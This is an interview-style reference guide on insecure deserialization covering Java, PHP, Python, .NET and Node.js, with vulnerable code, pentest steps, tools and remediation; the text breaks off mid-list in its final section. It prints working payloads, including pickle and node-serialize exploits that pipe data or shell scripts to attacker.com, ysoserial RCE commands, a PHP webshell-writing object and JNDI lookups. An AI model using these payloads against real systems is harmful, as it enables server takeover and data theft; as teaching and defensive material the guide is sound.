# Insecure Deserialization — Complete Security Engineer's Guide
> Interview-Ready Reference | Penetration Testing | Source Code Review | Remediation

---

## Table of Contents

1. [What is Serialization & Deserialization?](#1-what-is-serialization--deserialization)
2. [What is Insecure Deserialization?](#2-what-is-insecure-deserialization)
3. [Why is it Dangerous? (OWASP Context)](#3-why-is-it-dangerous-owasp-context)
4. [How the Attack Works — Mechanics](#4-how-the-attack-works--mechanics)
5. [Language-Specific Vulnerabilities & Code Examples](#5-language-specific-vulnerabilities--code-examples)
   - Java
   - PHP
   - Python
   - .NET (C#)
   - Node.js
6. [Attack Types & Payloads](#6-attack-types--payloads)
7. [Real-World CVEs & Scenarios](#7-real-world-cves--scenarios)
8. [Scenario-Based Interview Questions & Answers](#8-scenario-based-interview-questions--answers)
9. [How to Find It in Source Code (Code Review Checklist)](#9-how-to-find-it-in-source-code-code-review-checklist)
10. [How to Find It in Web App Penetration Testing](#10-how-to-find-it-in-web-app-penetration-testing)
11. [Where to Test — Given Only a URL](#11-where-to-test--given-only-a-url)
12. [Tools Used for Testing](#12-tools-used-for-testing)
13. [Common Mistakes That Lead to This Vulnerability](#13-common-mistakes-that-lead-to-this-vulnerability)
14. [Impact Assessment](#14-impact-assessment)
15. [Remediation & Secure Coding Practices](#15-remediation--secure-coding-practices)
16. [Bypass Techniques (Advanced)](#16-bypass-techniques-advanced)
17. [Interview Cheat Sheet — Quick Reference](#17-interview-cheat-sheet--quick-reference)

---

## 1. What is Serialization & Deserialization?

**Serialization** is the process of converting an in-memory object (class instance, data structure) into a format that can be stored or transmitted — such as bytes, JSON, XML, or binary.

**Deserialization** is the reverse — taking that stored/transmitted format and reconstructing it back into a live object in memory.

```
[Object in Memory]  ──serialize──►  [Bytes / JSON / XML]  ──► stored/sent
[Bytes / JSON / XML]  ──deserialize──►  [Object in Memory]  ──► used by app
```

### Common Serialization Formats

| Format       | Language(s)         | Example Marker / Header                        |
|--------------|---------------------|------------------------------------------------|
| Java Serial  | Java                | `AC ED 00 05` (hex), `rO0AB` (base64)         |
| PHP Serial   | PHP                 | `O:8:"UserObj":1:{s:4:"name";s:5:"admin";}` |
| Pickle       | Python              | `\x80\x04\x95` (opcode prefix)                |
| BinaryFormatter | .NET / C#        | `AAEAAAD/////` (base64 prefix)                |
| YAML/JSON    | Many                | Human-readable text                            |
| XML/SOAP     | Java, .NET, others  | `<?xml version="1.0"...>`                     |
| MessagePack  | Polyglot            | Binary, compact                                |

---

## 2. What is Insecure Deserialization?

Insecure Deserialization occurs when an application **deserializes data from an untrusted source without sufficient validation**, allowing an attacker to:

- Manipulate the serialized object to change application logic
- Inject a **gadget chain** that executes arbitrary code during the deserialization process itself
- Bypass authentication, tamper with data, or escalate privileges

> **Key Insight for Interviews:** The danger isn't just in *what* data the attacker provides — in many cases, **the exploit runs before the application ever uses the object**. The act of deserializing triggers the payload.

---

## 3. Why is it Dangerous? (OWASP Context)

- Listed as **OWASP Top 10 A08:2021** (previously A8:2017)
- Often leads directly to **Remote Code Execution (RCE)** — the highest severity
- Difficult to detect with WAFs because payloads are often binary or encoded
- Gadget chains can be constructed from **existing legitimate classes** in the classpath — no custom malware needed

---

## 4. How the Attack Works — Mechanics

### Standard Flow (No Attack)
```
Client sends cookie/token → App deserializes it → Gets User object → Checks role → Grants access
```

### Attack Flow
```
Attacker crafts malicious serialized payload
    → Embeds gadget chain (e.g., Runtime.exec("calc.exe"))
    → Sends in cookie/POST body/header
    → App calls deserialize()
    → Gadget chain fires DURING deserialization
    → RCE achieved BEFORE app logic even runs
```

### What is a Gadget Chain?

A gadget is a class that already exists in the application's classpath and has "interesting" methods (`readObject`, `toString`, `hashCode`, `compareTo`, etc.) that get called automatically during deserialization.

A **gadget chain** links multiple gadgets together so that their automatic method calls cascade into something dangerous — like executing an OS command.

```
DeserializationTrigger → GadgetA.readObject() → GadgetB.hashCode() → GadgetC.exec("cmd")
```

Libraries like **Apache Commons Collections**, **Spring Framework**, **Groovy** are notorious sources of gadget chains.

---

## 5. Language-Specific Vulnerabilities & Code Examples

---

### Java

#### Vulnerable Code

```java
// VULNERABLE: Deserializing user-controlled data directly
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // ← Danger: triggers readObject() on whatever class is in stream
```

#### Safe Code

```java
// SAFER: Use a look-ahead ObjectInputStream to whitelist allowed classes
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of("com.myapp.SafeUser", "java.lang.String");

    public SafeObjectInputStream(InputStream in) throws IOException { super(in); }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

#### Identification Markers

```
Bytes:  AC ED 00 05
Base64: rO0AB...
```

#### Dangerous Sinks in Java

```java
ObjectInputStream.readObject()
ObjectInputStream.readUnshared()
XMLDecoder.readObject()
XStream.fromXML()          // XStream library
ObjectMapper.readValue()   // Jackson with enableDefaultTyping()
Serialization.deserialize() // Kryo without class registration
```

#### Dangerous Gadget Libraries

- `commons-collections` (3.x / 4.x)
- `commons-beanutils`
- `spring-core`
- `groovy`
- `jdk7u21`, `jdk8u20` (JDK gadgets)

---

### PHP

#### Vulnerable Code

```php
<?php
// VULNERABLE: User-controlled data passed to unserialize()
$data = base64_decode($_COOKIE['user_data']);
$user = unserialize($data); // ← RCE if __wakeup() or __destruct() in a class
echo "Welcome " . $user->name;
```

#### How PHP Magic Methods Are Exploited

```php
class Logger {
    public $filename;
    public $data;

    // __destruct() is called automatically when object is garbage collected
    public function __destruct() {
        file_put_contents($this->filename, $this->data); // Write arbitrary file!
    }
}

// Attacker crafts:
// O:6:"Logger":2:{s:8:"filename";s:14:"/var/www/a.php";s:4:"data";s:20:"<?php system($_GET[c]);?>";}
// → Deserializing this writes a PHP webshell to disk
```

#### Safe Code

```php
<?php
// SAFE: Use JSON instead of serialize() for untrusted data
$data = json_decode(base64_decode($_COOKIE['user_data']), true);
$name = htmlspecialchars($data['name']); // Still sanitize!

// OR: If you MUST use unserialize, use allowed_classes
$user = unserialize($data, ['allowed_classes' => ['SafeUser']]);
```

#### Magic Methods Targeted in PHP Exploits

| Method       | When Called                              |
|--------------|------------------------------------------|
| `__wakeup()` | Immediately on deserialization           |
| `__destruct()`| When object is destroyed/gc'd          |
| `__toString()`| When object is printed/concatenated    |
| `__call()`   | Calling undefined method                 |
| `__get()`    | Accessing undefined property             |
| `__unserialize()` | PHP 7.4+ replacement for `__wakeup` |

---

### Python

#### Vulnerable Code

```python
import pickle
import base64
from flask import request

@app.route('/load')
def load():
    data = base64.b64decode(request.cookies.get('session'))
    obj = pickle.loads(data)  # ← CRITICAL: Never unpickle untrusted data
    return f"Hello {obj['user']}"
```

#### Exploit Payload

```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        # __reduce__ is called during pickling AND unpickling
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)  # Send this as cookie value
```

#### Safe Alternative

```python
# SAFE: Use JSON for session data
import json
import hmac, hashlib

SECRET = b'super-secret-key'

def make_session(data: dict) -> str:
    payload = json.dumps(data).encode()
    sig = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
    return base64.b64encode(payload).decode() + '.' + sig

def load_session(token: str) -> dict:
    payload_b64, sig = token.rsplit('.', 1)
    payload = base64.b64decode(payload_b64)
    expected = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Invalid session")
    return json.loads(payload)
```

#### Other Dangerous Python Modules

```python
pickle.loads()       # Most common
cPickle.loads()
marshal.loads()
yaml.load()          # Without Loader=yaml.SafeLoader → RCE via !!python/object
shelve              # Uses pickle internally
jsonpickle.decode()  # RCE via {"py/object": "os.system", ...}
```

---

### .NET (C#)

#### Vulnerable Code

```csharp
// VULNERABLE: BinaryFormatter is deprecated and dangerous
BinaryFormatter bf = new BinaryFormatter();
using var ms = new MemoryStream(Convert.FromBase64String(userInput));
var obj = (MyClass)bf.Deserialize(ms); // ← RCE possible
```

#### Safe Code

```csharp
// SAFE: Use System.Text.Json or DataContractSerializer with known types
var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
var obj = JsonSerializer.Deserialize<MyClass>(userInput, options);

// OR for binary: Use NetDataContractSerializer with known type list
// BinaryFormatter is BANNED in .NET 5+ by default
```

#### Dangerous .NET Sinks

```csharp
BinaryFormatter.Deserialize()        // Deprecated, RCE
NetDataContractSerializer.Deserialize()
SoapFormatter.Deserialize()
ObjectStateFormatter.Deserialize()
LosFormatter.Deserialize()           // Common in WebForms ViewState
JavaScriptSerializer.Deserialize()   // With custom type resolvers
JsonConvert.DeserializeObject()      // Newtonsoft with TypeNameHandling != None
XmlSerializer                        // Safer but can be abused
```

#### ViewState Attack (Classic ASP.NET)

```
ViewState is base64-encoded, serialized object passed in __VIEWSTATE form field.
If MAC validation is disabled OR the MachineKey is known → craft malicious ViewState → RCE
```

---

### Node.js

#### Vulnerable Code

```javascript
// VULNERABLE: node-serialize
const serialize = require('node-serialize');
const obj = serialize.unserialize(req.cookies.profile); // ← RCE via IIFE

// VULNERABLE: js-yaml without safeLoad
const yaml = require('js-yaml');
const data = yaml.load(userInput); // ← Pre-4.0 versions allow __proto__ pollution
```

#### Exploit (node-serialize)

```javascript
// Attacker sends this as cookie:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id | curl -d @- http://attacker.com')}()"}
// The IIFE (immediately invoked function expression) executes on deserialize
```

---

## 6. Attack Types & Payloads

### 1. Remote Code Execution (RCE)
Most severe. Gadget chain triggers OS command execution.

```bash
# ysoserial — Java RCE payload generator
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' | base64 -w0
```

### 2. Privilege Escalation / Auth Bypass

```php
// Original cookie:
// O:4:"User":1:{s:4:"role";s:4:"user";}

// Modified cookie (tampered):
// O:4:"User":1:{s:4:"role";s:5:"admin";}
```

### 3. Server-Side Request Forgery (SSRF) via Deserialization
Some gadget chains make HTTP requests internally, enabling SSRF.

### 4. Denial of Service (DoS)
Crafting deeply nested or recursive structures to exhaust memory/CPU.

```python
# Python Pickle DoS via recursive structure
import pickle, io
data = b'\x80\x04\x95\x13\x00\x00\x00\x00\x00\x00\x00]\x94(h\x00h\x00e.'
pickle.loads(data)  # Infinite recursion → stack overflow
```

### 5. Property Injection / Object Manipulation

```json
// JSON deserialization with type information
{"@class": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com/Exploit", "autoCommit": true}
// Triggers JNDI lookup → remote class loading → RCE (Log4Shell cousin)
```

---

## 7. Real-World CVEs & Scenarios

| CVE | System | Impact | Root Cause |
|-----|--------|--------|------------|
| CVE-2015-4852 | Oracle WebLogic | RCE | Java deserialization of T3 protocol |
| CVE-2016-4437 | Apache Shiro | Auth bypass / RCE | RememberMe cookie uses Java serialization with weak key |
| CVE-2017-9805 | Apache Struts 2 | RCE | REST plugin deserializes XML with XStream |
| CVE-2019-12384 | Jackson Databind | RCE | Polymorphic type handling → SSRF/RCE |
| CVE-2020-2555 | Oracle Coherence | RCE | Java deserialization via T3/IIOP |
| CVE-2021-44228 | Log4Shell (Log4j) | RCE | JNDI lookup triggered by deserialized logger message |
| CVE-2022-22965 | Spring4Shell | RCE | ClassLoader manipulation via data binding |
| PHP Object Injection | Many PHP CMSs | RCE / File write | unserialize() on user input |

### Apache Shiro — Classic Interview Scenario

```
1. Shiro encodes session in RememberMe cookie as:
   AES-encrypt(serialize(PrincipalCollection)) → base64

2. Default Shiro key was hardcoded: "kPH+bIxk5D2deZiIxcaaaA=="

3. Attacker:
   a. Generate Java gadget payload with ysoserial
   b. AES-encrypt with known default key
   c. Base64-encode → send as rememberMe cookie
   d. Server decrypts → deserializes → RCE
```

---

## 8. Scenario-Based Interview Questions & Answers

---

**Q1: You're doing a black-box pentest. You see a cookie: `user=rO0ABXNy...`. What do you do?**

> **Answer:**
> The prefix `rO0AB` is base64-encoded Java serialized data (`AC ED 00 05` in hex). Steps:
> 1. Decode it: `echo 'rO0AB...' | base64 -d | xxd | head`
> 2. Identify the class structure using `SerializationDumper` or look at readable strings
> 3. Check if the server uses known gadget-chain libraries (look at HTTP headers for server tech, error pages for stack traces)
> 4. Generate test payloads with `ysoserial` using DNS callback first (`Collaborator/interactsh`) to confirm if deserialization occurs without causing harm
> 5. If DNS callback fires → confirmed deserialization → escalate to RCE payload

---

**Q2: You find `unserialize($_COOKIE['prefs'])` in PHP code. Walk me through the exploit.**

> **Answer:**
> 1. Identify all classes in the application that have magic methods (`__wakeup`, `__destruct`, `__toString`)
> 2. Look for classes with file write, code eval, or system call capability in those methods
> 3. Craft a PHP serialized payload that instantiates such a class with attacker-controlled properties
> 4. Base64-encode it, set as cookie, send request
> 5. PHP deserializes → magic method fires → payload executes
> Example: A `Logger` class with `__destruct` doing `file_put_contents($this->file, $this->content)` → write a PHP webshell

---

**Q3: How would you differentiate between a data tampering and RCE deserialization vulnerability?**

> **Answer:**
> - **Data tampering**: Attacker modifies properties of a deserialized object to change app behavior (e.g., change `role=user` to `role=admin`). The object is valid, just with different data. Impact: Auth bypass, logic flaws.
> - **RCE via gadget chains**: The exploit fires *during* deserialization through class method cascades. The attacker doesn't care about the object's final state — they just need the deserialization to happen. Impact: Full system compromise.
> The key test: does simply changing a field work (data tampering)? Or does the payload need specific class structure that chains method calls (RCE)?

---

**Q4: A developer says "We sign the serialized cookie with HMAC, so we're safe." Are they?**

> **Answer:**
> HMAC protects **integrity** — it prevents *tampering* with the signed cookie. However:
> - If the signing key is weak or leaked → still exploitable
> - If there's a separate deserialization endpoint that doesn't check signatures (e.g., internal API, debugging endpoint) → still exploitable
> - HMAC doesn't protect against all cases of insecure deserialization if the attacker can get a valid signed payload by other means (e.g., CSRF to get their own crafted payload signed)
> **The real fix** is to not deserialize untrusted/complex objects at all, regardless of HMAC.

---

**Q5: You're reviewing Java code and find Jackson `ObjectMapper`. Is this dangerous?**

> **Answer:**
> It depends on configuration:
> ```java
> // DANGEROUS:
> mapper.enableDefaultTyping(); // Deprecated but still used
> mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ObjectMapper.DefaultTyping.NON_FINAL);
>
> // SAFER:
> mapper.activateDefaultTyping(BasicPolymorphicTypeValidator.builder()
>     .allowIfSubType("com.myapp.models.")
>     .build(), ObjectMapper.DefaultTyping.NON_FINAL);
>
> // SAFEST: Don't use default typing at all
> ```
> With `enableDefaultTyping`, an attacker can send JSON like `{"@class":"com.sun.rowset.JdbcRowSetImpl",...}` to trigger RCE.

---

**Q6: You found a .NET application with ViewState. How do you test for deserialization?**

> **Answer:**
> 1. Extract `__VIEWSTATE` value from form
> 2. Check if `__VIEWSTATEMAC` is present — if not, MAC validation is OFF
> 3. If MAC is ON, try to find the `MachineKey` (in `web.config`, error messages, or brute force if weak)
> 4. Use **YSoSerial.Net** to generate malicious ViewState:
>    ```
>    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "whoami > C:\output.txt" --path="/page.aspx" --apppath="/" --islegacy
>    ```
> 5. Submit tampered ViewState in `__VIEWSTATE` field
> 6. If code executes → RCE confirmed

---

**Q7: During SAST, what patterns in Python code would you flag for insecure deserialization?**

> **Answer:**
> Flag immediately:
> ```python
> pickle.loads(user_input)          # Direct RCE
> cPickle.loads(...)
> yaml.load(data)                   # Without Loader param (pre-4.0)
> yaml.load(data, Loader=yaml.FullLoader) # Still dangerous in some versions
> marshal.loads(...)
> jsonpickle.decode(user_data)
> ```
> Flag for review:
> ```python
> shelve.open(user_controlled_path) # shelve uses pickle internally
> dill.loads(...)                    # dill extends pickle
> ```
> The key question: **is the data source user-controlled?** Trace the data back to HTTP request, file upload, WebSocket, or external API.

---

**Q8: How does the Log4Shell (CVE-2021-44228) vulnerability relate to deserialization?**

> **Answer:**
> Log4Shell is related but technically a JNDI injection, not classical deserialization. However:
> - Log4j deserializes log messages through string interpolation `${jndi:ldap://attacker.com/exploit}`
> - The LDAP server returns a reference to a remote Java class
> - Java deserializes that class → executes static initializer → RCE
> It's a **remote class loading attack** that uses serialization as part of the chain. The connection: Java's JNDI lookup can trigger deserialization of a remotely fetched serialized object. Understanding this shows depth in knowing how deserialization intersects with other vulns.

---

## 9. How to Find It in Source Code (Code Review Checklist)

### ✅ Universal Checklist

```
[ ] Search for dangerous deserialization functions (per language — see table below)
[ ] Trace all data flows FROM: HTTP request body, cookies, headers, URL params, file uploads, WebSockets, message queues (Kafka/RabbitMQ), gRPC/RPC calls
[ ] Check if user-controlled data reaches deserialization sinks WITHOUT:
    - Type/class whitelisting
    - HMAC/signature validation BEFORE deserialization
    - Schema validation
[ ] Identify all classes with magic methods / special serialization methods
[ ] Check dependency list for known gadget chain libraries
[ ] Review custom readObject() / __wakeup() implementations for dangerous operations
[ ] Look for "convenience" debugging endpoints that dump/load objects
[ ] Check configuration files for serialization settings (e.g., Jackson default typing)
```

### Language-Specific Sink Search Commands

**Java:**
```bash
grep -rn "readObject\|readUnshared\|fromXML\|enableDefaultTyping\|XMLDecoder" --include="*.java" .
grep -rn "ObjectInputStream\|XStream\|Kryo\|Hessian\|Burlap" --include="*.java" .
```

**PHP:**
```bash
grep -rn "unserialize\s*(" --include="*.php" .
grep -rn "__wakeup\|__destruct\|__toString\|__unserialize" --include="*.php" .
```

**Python:**
```bash
grep -rn "pickle\.loads\|pickle\.load\|cPickle\|yaml\.load\|marshal\.loads\|jsonpickle\.decode" --include="*.py" .
grep -rn "shelve\.open\|dill\.loads" --include="*.py" .
```

**.NET:**
```bash
grep -rn "BinaryFormatter\|NetDataContractSerializer\|SoapFormatter\|LosFormatter\|ObjectStateFormatter" --include="*.cs" .
grep -rn "TypeNameHandling\|enableDefaultTyping\|DeserializeObject" --include="*.cs" .
```

**Node.js:**
```bash
grep -rn "unserialize\|\.load\b" --include="*.js" .
grep -rn "node-serialize\|js-yaml\|serialize-javascript" package.json package-lock.json
```

### Dependency Check

```bash
# Java: Check for known gadget chain libraries
mvn dependency:tree | grep -E "commons-collections|commons-beanutils|spring-core|groovy"

# Python:
pip show pyyaml | grep Version   # Check if < 6.0

# .NET: Check for banned types
grep -rn "BinaryFormatter" .     # Should return ZERO results in modern code

# Node.js:
npm audit                         # Checks known vulnerable packages
```

---

## 10. How to Find It in Web App Penetration Testing

### Step-by-Step Testing Methodology

#### Step 1: Fingerprint & Recon

```
1. Identify server-side language (HTTP headers, error pages, file extensions)
   - X-Powered-By: PHP/7.4
   - Server: Apache Tomcat (Java likely)
   
2. Collect all data inputs:
   - Cookies (especially session, remember-me, auth tokens)
   - POST body (JSON, XML, binary)
   - HTTP headers (custom ones like X-Auth-Token)
   - Hidden form fields (__VIEWSTATE, __CSRFTOKEN)
   - URL parameters
   - WebSocket messages
   - File uploads
```

#### Step 2: Identify Serialized Data

```
Encoding patterns to look for:

Java:    rO0AB... (base64) or AC ED 00 05 (hex)
PHP:     O:4:"User":... or a:2:{...}
Python:  \x80\x04\x95 (binary) or hex starting with gASV (base64 pickle)
.NET:    AAEAAAD///// (BinaryFormatter base64) or /wEy... (ViewState)
Ruby:    \x04\x08 (Marshal format)
```

Tools:
```bash
# Detect serialized data in Burp: use "Hackvertor" or "Serialized Scanner" extension
# CLI: Check base64 decoded values
echo "rO0ABX..." | base64 -d | xxd | head -2
```

#### Step 3: Passive Testing (Safe)

```
1. Modify values in serialized objects:
   - Change role: user → admin
   - Change user ID: 1 → 2
   - Change boolean: false → true
   
2. Send modified data and observe response:
   - 500 error with class name → deserialization confirmed, type mismatch
   - Changed behavior → data tampering possible
   - No change → integrity check (HMAC?) may be in place
```

#### Step 4: Active Testing — Out-of-Band Detection

```bash
# Use Burp Collaborator or interactsh to detect blind deserialization
# Generate DNS-callback payloads (safe, no command execution)

# Java - ysoserial with URLDNS gadget (only DNS lookup, no RCE):
java -jar ysoserial.jar URLDNS "http://unique-id.burpcollaborator.net" | base64 -w0

# Send as cookie/body parameter
# If DNS request appears in Collaborator → Deserialization is happening!
```

#### Step 5: Confirm & Escalate

```bash
# Once DNS callback confirmed, try RCE payloads:
java -jar ysoserial.jar CommonsCollections6 'nslookup rce-confirmed.attacker.com' | base64 -w0

# If second DNS fires → RCE confirmed
# Escalate: reverse shell, file read, credential extraction
```

#### Step 6: PHP-Specific Testing

```bash
# 1. Identify PHP serialized data
# 2. Enumerate classes by reviewing disclosed source code, error messages
# 3. Construct PHP object injection payload manually or with phpggc:
phpggc Monolog/RCE1 system 'id' -b   # Generate base64-encoded PHP gadget chain
# Common frameworks: Laravel, Symfony, WordPress, Drupal, Magento
```

#### Step 7: Python-Specific Testing

```python
# Generate malicious pickle payload
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('nslookup callback.attacker.com',))

print(base64.b64encode(pickle.dumps(RCE())).decode())
# Send as cookie/session token
```

### Burp Suite Extensions to Use

```
1. Java Deserialization Scanner — auto-scans for Java deserialization
2. GadgetProbe                 — fingerprints available gadget chains
3. Freddy                      — multi-language deserialization scanner
4. PHP Object Injection Check  — PHP-specific
5. ViewState Editor            — .NET ViewState tampering
6. Hackvertor                  — encoding/decoding transformations
```

---

## 11. Where to Test — Given Only a URL

If you're given only `https://target.com`, here's exactly where to probe:

### Priority Testing Points

```
1. SESSION COOKIES
   → Decode all cookies (base64, URL-decode, hex-decode)
   → Look for serialization markers
   → Example: sessionid, PHPSESSID, rememberMe, auth_token, .ASPXAUTH

2. REMEMBER-ME / PERSISTENT AUTH COOKIES
   → High-value target — often uses serialized session data
   → Apache Shiro: rememberMe cookie
   → Custom implementations

3. LOGIN FUNCTIONALITY
   → POST body: username/password fields may be in XML, JSON with type info
   → SSO/SAML assertions (XML deserialization)
   → OAuth tokens

4. HIDDEN FORM FIELDS
   → __VIEWSTATE (ASP.NET)
   → __EVENTVALIDATION (ASP.NET)
   → Custom "state" parameters

5. FILE UPLOAD ENDPOINTS
   → Uploaded files may be deserialized server-side
   → Java .ser files, Python .pkl, PHP serialized objects

6. API ENDPOINTS
   → Content-Type: application/x-java-serialized-object
   → Content-Type: application/octet-stream
   → Custom binary protocols
   → GraphQL variables with complex type hints

7. WEBSOCKET MESSAGES
   → Real-time apps serialize state over WebSockets
   → Intercept with Burp WS tab

8. CUSTOM HTTP HEADERS
   → X-Auth-Token, X-Session-Data, X-User-Context
   → Sometimes base64-encoded serialized objects

9. URL PARAMETERS
   → ?data=rO0AB... or ?state=O:4:...
   → Less common but exists in legacy apps

10. ERROR MESSAGES & STACK TRACES
    → May reveal class names, library versions → identify gadget chains
    → Force errors: send malformed data, truncate serialized payloads
```

### Automated Scan from URL Only

```bash
# 1. Spider the application first
burpsuite  # Spider target, then run Active Scanner with deserialization checks

# 2. Use nuclei templates for deserialization
nuclei -u https://target.com -t vulnerabilities/deserialization/

# 3. Check for Java deserialization in all requests automatically
java -jar jaeles scanner -u https://target.com

# 4. Test common paths for exposed Java serialization endpoints
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/api-endpoints.txt \
  -H "Content-Type: application/x-java-serialized-object"
```

---

## 12. Tools Used for Testing

| Tool | Language | Purpose |
|------|----------|---------|
| **ysoserial** | Java | Generate Java gadget chain payloads |
| **ysoserial.net** | .NET | Generate .NET deserialization payloads |
| **phpggc** | PHP | PHP gadget chain generator |
| **SerializationDumper** | Java | Parse/visualize Java serialized data |
| **Burp Suite** | All | Intercept, modify, replay requests |
| **Freddy** | Multi | Auto-detect deserialization in Burp |
| **GadgetProbe** | Java | Fingerprint classpath for gadgets |
| **Java Deserialization Scanner** | Java | Burp extension, automated scanning |
| **interactsh / Collaborator** | All | Out-of-band DNS/HTTP detection |
| **Hackvertor** | All | Burp plugin for encoding |
| **pickle-tools** | Python | Analyze/craft Python pickles |
| **deser-lab** | Multi | Practice environment |
| **gadgetinspector** | Java | Static analysis for gadget chains |

---

## 13. Common Mistakes That Lead to This Vulnerability

```
❌ MISTAKE 1: Using serialization for session management
   → Storing User/Session objects as serialized cookies
   → Fix: Use JWT with signed claims, or server-side sessions with opaque tokens

❌ MISTAKE 2: Trusting data because it's "encrypted"
   → "We AES-encrypt our serialized cookie so it's safe"
   → Fix: Encryption prevents reading, NOT manipulation if key is known/weak
   → Integrity (HMAC) + Encryption together, but better: don't serialize untrusted data

❌ MISTAKE 3: Checking user role AFTER deserialization
   → Object is created (and gadgets fire) before any auth check runs
   → Fix: Validate at network/transport level before any deserialization

❌ MISTAKE 4: Using yaml.load() without SafeLoader
   → yaml.load(data) in Python allows arbitrary Python object construction
   → Fix: yaml.safe_load(data) always

❌ MISTAKE 5: Using pickle/marshal for inter-service communication
   → Internal APIs use pickle for performance → insider threat / SSRF pivot
   → Fix: Use Protocol Buffers, MessagePack (safe schemas), or JSON

❌ MISTAKE 6: Allowing polymorphic deserialization in Jackson
   → ObjectMapper.enableDefaultTyping() → attacker controls which class to instantiate
   → Fix: Use @JsonTypeInfo with explicit allowed subtypes

❌ MISTAKE 7: Keeping BinaryFormatter in .NET code
   → BinaryFormatter is deprecated for good reason
   → Fix: Migrate to System.Text.Json, DataContractSerializer, or MessagePack

❌ MISTAKE 8: Not validating class type before using deserialized object
   → Deserializing then casting: (User) stream.readObject()
   → Fix: Whitelist classes BEFORE deserialization using look-ahead stream

❌ MISTAKE 9: Exposing debugging/admin endpoints that load serialized state
   → /admin/loadSession?data=... left in production
   → Fix: Remove all debug deserialization endpoints before deployment

❌ MISTAKE 10: Not monitoring for deserialization exceptions
   → ClassNotFoundException, InvalidClassException in logs = someone probing
   → Fix: Log and alert on deserialization errors; treat as security events
```

---

## 14. Impact Assessment

### Severity Matrix

| Attack Outcome | Severity | CVSS Range |
|----------------|----------|-----------|
| Remote Code Execution | Critical | 9.0 – 10.0 |
| Privilege Escalation (admin access) | High | 7.5 – 9.0 |
| Authentication Bypass | High | 7.0 – 8.5 |
| Server-Side Request Forgery | High | 7.0 – 8.0 |
| Data Tampering (object property change) | Medium-High | 5.5 – 7.5 |
| Denial of Service | Medium | 5.0 – 7.0 |
| Information Disclosure | Medium | 4.0 – 6.0 |

### Business Impact

```
Technical Impact:
├── Full server compromise via RCE
├── Lateral movement to internal network
├── Data exfiltration (PII, credentials, IP)
├── Ransomware deployment
├── Supply chain attack pivot
└── Persistent backdoor installation

Business Impact:
├── Regulatory fines (GDPR, HIPAA, PCI-DSS)
├── Breach notification requirements
├── Reputational damage
├── Service downtime
└── Legal liability
```

---

## 15. Remediation & Secure Coding Practices

### Tier 1 — Architectural (Best)

```
1. AVOID DESERIALIZING UNTRUSTED DATA ENTIRELY
   → Use data-only formats: JSON, XML, Protocol Buffers, Avro
   → If session data needed: use server-side storage (Redis) + opaque token
   → These formats describe data, not behavior → no gadget chains possible

2. USE SECURE ALTERNATIVES
   Language        Insecure                  Secure Alternative
   Java            ObjectInputStream         JSON (Jackson) + explicit type mapping
   PHP             unserialize()             json_decode() or specific parsers
   Python          pickle.loads()            json.loads(), struct.unpack()
   .NET            BinaryFormatter           System.Text.Json, Protobuf
   Node.js         node-serialize            JSON.parse() with schema validation
```

### Tier 2 — Defense in Depth (If Deserialization Required)

```java
// Java: Implement class whitelist with look-ahead stream
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> WHITELIST = Collections.unmodifiableSet(
        new HashSet<>(Arrays.asList(
            "com.myapp.model.User",
            "com.myapp.model.Session",
            "java.lang.String",
            "java.util.ArrayList"
        ))
    );

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!WHITELIST.contains(desc.getName())) {
            throw new InvalidClassException(
                "Unauthorized deserialization attempt: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

```php
<?php
// PHP: Use allowed_classes parameter (PHP 7.0+)
$obj = unserialize($data, ['allowed_classes' => ['UserPreferences', 'CartItem']]);

// PHP: Validate before unserialize
function safeUnserialize(string $data, array $allowed): mixed {
    if (!preg_match('/^[OasSibNd]/', $data)) {
        throw new \InvalidArgumentException('Invalid serialized data');
    }
    return unserialize($data, ['allowed_classes' => $allowed]);
}
```

```python
# Python: Never use pickle for untrusted data — use JSON
import json
from jsonschema import validate

SCHEMA = {
    "type": "object",
    "properties": {
        "user_id": {"type": "integer"},
        "role": {"type": "string", "enum": ["user", "moderator"]}
    },
    "required": ["user_id", "role"],
    "additionalProperties": False
}

def safe_load_session(data: str) -> dict:
    obj = json.loads(data)
    validate(instance=obj, schema=SCHEMA)  # Schema validation
    return obj
```

### Tier 3 — Integrity Checking

```python
# Sign serialized data with HMAC — prevents tampering (NOT a substitute for Tier 1/2)
import hmac, hashlib, base64, json, os

SECRET_KEY = os.environ['SESSION_SECRET'].encode()

def serialize_signed(data: dict) -> str:
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    sig = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
    return f"{payload}.{sig}"

def deserialize_verified(token: str) -> dict:
    try:
        payload_b64, sig = token.rsplit('.', 1)
    except ValueError:
        raise ValueError("Invalid token format")

    expected = hmac.new(SECRET_KEY, payload_b64.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Signature verification failed")  # Don't reveal which part failed

    return json.loads(base64.b64decode(payload_b64))
```

### Tier 4 — Runtime Defense

```
1. JAVA AGENT PROTECTION
   → Deploy serialization kill-switch agents:
     - NotSoSerial
     - SerialKiller
     - contrast-rO0 (Contrast Security)
   → These intercept ObjectInputStream.resolveClass() at JVM level

2. NETWORK-LEVEL CONTROLS
